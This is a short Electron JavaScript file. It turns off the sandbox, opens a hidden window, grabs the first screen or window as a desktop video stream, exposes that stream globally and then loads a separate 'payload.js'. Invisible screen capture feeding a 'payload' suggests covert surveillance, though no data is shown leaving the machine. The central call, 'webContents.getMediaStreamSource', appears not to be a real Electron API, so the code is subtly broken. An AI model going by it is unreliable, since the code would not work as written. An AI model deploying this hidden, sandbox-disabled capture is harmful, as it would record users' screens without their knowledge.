const { app, desktopCapturer, BrowserWindow } = require('electron');
const path = require('path');

// Run in headless mode for server environments
app.commandLine.appendSwitch('no-sandbox');
app.commandLine.appendSwitch('disable-gpu');

let localStream = null;

async function init() {
    await app.whenReady();
    
    // Create a hidden window to act as the media source context
    const win = new BrowserWindow({ show: false });
    await win.loadURL('about:blank');

    try {
        // Get available sources (screens and windows)
        const sources = await desktopCapturer.getSources({ 
            types: ['screen', 'window'] 
        });
        
        if (sources.length === 0) {
            console.error("[ERROR] No display sources found");
            return;
        }

        // Prefer the first screen source
        const source = sources[0]; 
        
        console.log(`[LIVE] Capturing source: ${source.name}`);

        // Create the MediaStream from the desktop source
        localStream = await win.webContents.getMediaStreamSource({
            audio: false,
            video: {
                mandatory: {
                    chromeMediaSource: 'desktop',
                    chromeMediaSourceId: source.id
                }
            }
        });
        
        console.log("[LIVE] Stream active and ready");
    } catch (e) {
        console.error("[ERROR] Capture failed", e);
    }
    
    // Expose the stream to the rest of the application
    global.electronLocalStream = localStream;
    
    // Start the main payload logic
    require('./payload.js');
}

init();
